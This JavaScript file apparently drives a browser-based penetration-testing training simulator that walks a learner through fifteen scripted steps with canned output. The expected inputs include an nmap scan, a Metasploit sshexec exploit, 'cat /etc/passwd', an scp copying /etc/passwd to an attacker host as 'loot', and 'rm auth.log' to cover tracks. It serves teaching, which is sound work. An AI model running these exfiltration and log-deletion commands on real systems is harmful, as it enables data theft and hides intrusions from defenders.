document.addEventListener('DOMContentLoaded', function () {
    const terminalInput = document.getElementById('terminal-input');
    const terminalContent = document.getElementById('terminal-content');
    const guidanceSteps = document.getElementById('guidance-steps');
    document.getElementById('play-music').addEventListener('click', function() {
        const backgroundMusic = document.getElementById('background-music');
        backgroundMusic.play();
    });
    
    // Adjust the volume of the background music
    const volumeSlider = document.getElementById('volume-slider');
    volumeSlider.addEventListener('input', function() {
        const backgroundMusic = document.getElementById('background-music');
        backgroundMusic.volume = volumeSlider.value;
    });
    
    
    // Step 1: Port Scan
    function step1() {
        updateGuidanceMenu('Step 1: Perform a port scan using the command: <code>nmap -sS 192.168.1.5</code>');
        addDescription('This task identifies open ports on the target IP address to understand the services running on the system.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "nmap -sS 192.168.1.5") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-24 12:00 UTC<br>
                        Nmap scan report for 192.168.1.5<br>
                        Host is up (0.00028s latency).<br>
                        Not shown: 999 filtered ports<br>
                        PORT    STATE  SERVICE<br>
                        22/tcp  open   ssh<br>
                        80/tcp  open   http<br>
                        443/tcp open   https<br>
                        <br>
                        Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step2();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please try again.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 2: Use Metasploit
    function step2() {
        updateGuidanceMenu('Step 2: Start Metasploit using the command: <code>msfconsole -q</code>');
        addDescription('Metasploit is a powerful tool used to exploit vulnerabilities in systems. We are opening the Metasploit console here.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "msfconsole -q") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        msf6 > use exploit/unix/ssh/sshexec
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step3();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please try again.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 3: Set RHOST
    function step3() {
        updateGuidanceMenu('Step 3: Set the target IP (RHOST) using the command: <code>set RHOSTS 192.168.1.5</code>');
        addDescription('RHOST is the target IP. This setup is essential for establishing a connection.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "set RHOSTS 192.168.1.5") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        RHOST set to 192.168.1.5
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step4();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please set RHOST correctly.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 4: Set LHOST
    function step4() {
        updateGuidanceMenu('Step 4: Set your IP (LHOST) using the command: <code>set LHOST 192.168.1.10</code>');
        addDescription('LHOST is the attackerâ€™s IP. This setup is essential for establishing a connection.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "set LHOST 192.168.1.10") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        LHOST set to 192.168.1.10
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step5();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please set LHOST correctly.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 5: Execute the Exploit
    function step5() {
        updateGuidanceMenu('Step 5: Execute the exploit using the command: <code>run</code> or <code>exploit</code>');
        addDescription('This step simulates running the exploit to gain access to the target system.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "run" || inputCommand === "exploit") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        [+] Exploit successful! Command shell session opened on 192.168.1.5:22
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step6();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please use the correct command to execute the exploit.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 6: List Directory
    function step6() {
        updateGuidanceMenu('Step 6: List directory contents with the command: <code>ls</code>');
        addDescription('The ls command lists the files and directories in the current directory.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "ls") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        bin<br>
                        boot<br>
                        dev<br>
                        etc<br>
                        home<br>
                        ...
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step7();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please use the ls command to list directory contents.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 7: Navigate to Directory
    function step7() {
        updateGuidanceMenu('Step 7: Navigate to the etc directory using the command: <code>cd /etc</code>');
        addDescription('The cd command changes the current directory to the specified directory.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "cd /etc") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        /etc
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step8();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please use the cd command to navigate to the etc directory.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 8: List Contents of /etc
    function step8() {
        updateGuidanceMenu('Step 8: List the contents of /etc directory using the command: <code>ls</code>');
        addDescription('This step lists the files in the /etc directory, including the passwd file.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "ls") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        passwd<br>
                        shadow<br>
                        group<br>
                        ...
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step9();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please use the ls command to list the contents of /etc.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 9: Retrieve Sensitive Information
    function step9() {
        updateGuidanceMenu('Step 9: Retrieve sensitive information using the command: <code>cat /etc/passwd</code>');
        addDescription('The cat command displays the contents of the specified file.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "cat /etc/passwd") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        root:x:0:0:root:/root:/bin/bash<br>
                        user:x:1000:1000:User:/home/user:/bin/bash<br>
                        ...
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step10();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please use the cat command to retrieve the file contents.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 10: Tunnel Out Information
    function step10() {
        updateGuidanceMenu('Step 10: Tunnel out the information using the command: <code>scp /etc/passwd hacker@192.168.1.10:/home/hacker/loot</code>');
        addDescription('The scp command securely copies files from one host to another over SSH.');

        terminalInput.addEventListener('keydown', function handler(event) {
            if (event.key === 'Enter') {
                const inputCommand = terminalInput.value.trim();
                if (inputCommand === "scp /etc/passwd hacker@192.168.1.10:/home/hacker/loot") {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `
                    <p>
                        /etc/passwd                                  100%  124KB  10.0MB/s   00:00<br>
                        File successfully transferred.
                    </p>`;
                    terminalInput.value = '';
                    terminalInput.removeEventListener('keydown', handler);
                    step11();
                } else {
                    terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                    terminalContent.innerHTML += `<p class="error">Invalid command. Please use the scp command to tunnel out the information.</p>`;
                    terminalInput.value = '';
                }
                terminalContent.scrollTop = terminalContent.scrollHeight;
            }
        });
    }

    // Step 11: Navigate to the Log Directory
function step11() {
    updateGuidanceMenu('Step 11: Navigate to the log directory using the command: <code>cd /var/log</code>');
    addDescription('The /var/log directory typically contains logs. Letâ€™s navigate to this directory.');

    terminalInput.addEventListener('keydown', function handler(event) {
        if (event.key === 'Enter') {
            const inputCommand = terminalInput.value.trim();
            if (inputCommand === "cd /var/log") {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p>/var/log</p>`;
                terminalInput.value = '';
                terminalInput.removeEventListener('keydown', handler);
                step12();
            } else {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p class="error">Invalid command. Please navigate to the correct directory.</p>`;
                terminalInput.value = '';
            }
            terminalContent.scrollTop = terminalContent.scrollHeight;
        }
    });
}

// Step 12: List Log Files
function step12() {
    updateGuidanceMenu('Step 12: List the log files using the command: <code>ls</code>');
    addDescription('The ls command lists the files in the current directory. Weâ€™ll check what logs are available.');

    terminalInput.addEventListener('keydown', function handler(event) {
        if (event.key === 'Enter') {
            const inputCommand = terminalInput.value.trim();
            if (inputCommand === "ls") {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p>auth.log<br>syslog<br>kern.log<br>...</p>`;
                terminalInput.value = '';
                terminalInput.removeEventListener('keydown', handler);
                step13();
            } else {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p class="error">Invalid command. Please list the directory contents.</p>`;
                terminalInput.value = '';
            }
            terminalContent.scrollTop = terminalContent.scrollHeight;
        }
    });
}

// Step 13: Find Specific Log Entries
function step13() {
    updateGuidanceMenu('Step 13: Search for specific log entries using the command: <code>grep "192.168.1.5" auth.log</code>');
    addDescription('The grep command searches for specific patterns in files. Here weâ€™re looking for entries related to our target IP.');

    terminalInput.addEventListener('keydown', function handler(event) {
        if (event.key === 'Enter') {
            const inputCommand = terminalInput.value.trim();
            if (inputCommand === `grep "192.168.1.5" auth.log`) {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p>Aug 24 12:00:00 server sshd[12345]: Accepted password for root from 192.168.1.5 port 22<br>Aug 24 12:05:00 server sshd[12345]: Connection closed by 192.168.1.5</p>`;
                terminalInput.value = '';
                terminalInput.removeEventListener('keydown', handler);
                step14();
            } else {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p class="error">Invalid command. Please use grep to search for the log entries.</p>`;
                terminalInput.value = '';
            }
            terminalContent.scrollTop = terminalContent.scrollHeight;
        }
    });
}

// Step 14: Delete the Log Files
function step14() {
    updateGuidanceMenu('Step 14: Delete the log files using the command: <code>rm auth.log</code>');
    addDescription('The rm command deletes files. We will now delete the log file to cover our tracks.');

    terminalInput.addEventListener('keydown', function handler(event) {
        if (event.key === 'Enter') {
            const inputCommand = terminalInput.value.trim();
            if (inputCommand === "rm auth.log") {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p>auth.log successfully deleted.</p>`;
                terminalInput.value = '';
                terminalInput.removeEventListener('keydown', handler);
                step15();
            } else {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p class="error">Invalid command. Please use the rm command to delete the logs.</p>`;
                terminalInput.value = '';
            }
            terminalContent.scrollTop = terminalContent.scrollHeight;
        }
    });
}

// Step 15: Exit the System
function step15() {
    updateGuidanceMenu('Step 15: Exit the system using the command: <code>exit</code>');
    addDescription('The exit command will log you out of the current session.');

    terminalInput.addEventListener('keydown', function handler(event) {
        if (event.key === 'Enter') {
            const inputCommand = terminalInput.value.trim();
            if (inputCommand === "exit") {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p>Connection to 192.168.1.5 closed.</p>`;
                terminalInput.value = '';
                terminalInput.removeEventListener('keydown', handler);
                setTimeout(() => {
                    alert('Congratulations! You have successfully completed the penetration test! Refresh page to start again.');
                }, 1000);
            } else {
                terminalContent.innerHTML += `<p><span class="user-command">> ${inputCommand}</span></p>`;
                terminalContent.innerHTML += `<p class="error">Invalid command. Please use the exit command to log out.</p>`;
                terminalInput.value = '';
            }
            terminalContent.scrollTop = terminalContent.scrollHeight;
        }
    });

    }

    // Start with Step 1
    step1();

    // Function to update the guidance menu
    function updateGuidanceMenu(stepText) {
        guidanceSteps.innerHTML = ''; // Clear the existing content
        guidanceSteps.innerHTML = `<li>${stepText}</li>`; // Add the new step
    }

    // Function to add descriptions under each step
    function addDescription(description) {
        guidanceSteps.innerHTML += `<p>${description}</p>`;
    }
});
